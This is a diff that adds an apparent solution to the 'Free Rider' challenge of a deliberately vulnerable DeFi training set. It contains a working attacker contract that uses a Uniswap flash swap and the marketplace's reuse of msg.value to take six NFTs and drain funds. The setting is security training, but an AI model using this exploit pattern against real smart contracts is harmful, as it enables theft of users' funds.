@@ -7,6 +7,7 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
@@ -123,7 +124,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        FreeRiderAttacker attacker =
+            new FreeRiderAttacker(uniswapPair, marketplace, weth, nft, address(recoveryManager));
+        attacker.attack();
     }
 
     /**
@@ -145,4 +148,71 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract FreeRiderAttacker is IERC721Receiver {
+    uint256 private constant NFT_PRICE = 15 ether;
+    uint256 private constant AMOUNT_OF_NFTS = 6;
+
+    IUniswapV2Pair public immutable pair;
+    FreeRiderNFTMarketplace public immutable marketplace;
+    WETH public immutable weth;
+    DamnValuableNFT public immutable nft;
+    address public immutable recoveryManager;
+    address public immutable owner;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        FreeRiderNFTMarketplace _marketplace,
+        WETH _weth,
+        DamnValuableNFT _nft,
+        address _recoveryManager
+    ) {
+        pair = _pair;
+        marketplace = _marketplace;
+        weth = _weth;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        owner = msg.sender;
+    }
+
+    function attack() external {
+        // Non-empty data makes the pair treat this as a flash swap (token0 is WETH)
+        pair.swap(NFT_PRICE, 0, address(this), hex"00");
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        require(msg.sender == address(pair), "not the pair");
+
+        // 1. Unwrap the borrowed WETH to get the 15 ETH needed for the first check
+        weth.withdraw(amount0);
+
+        // 2. Buy all six NFTs with a single 15 ETH payment; the marketplace pays
+        //    the new owner (us) 15 ETH per NFT
+        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            ids[i] = i;
+        }
+        marketplace.buyMany{value: NFT_PRICE}(ids);
+
+        // 3. Repay the flash swap with the 0.3% fee
+        uint256 repay = amount0 + (amount0 * 3) / 997 + 1;
+        weth.deposit{value: repay}();
+        weth.transfer(address(pair), repay);
+
+        // 4. Hand the NFTs to the recovery manager; the sixth one triggers the bounty to `owner`
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(owner));
+        }
+
+        // 5. Keep the remaining ETH with the player
+        (bool ok,) = owner.call{value: address(this).balance}("");
+        require(ok, "forward failed");
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
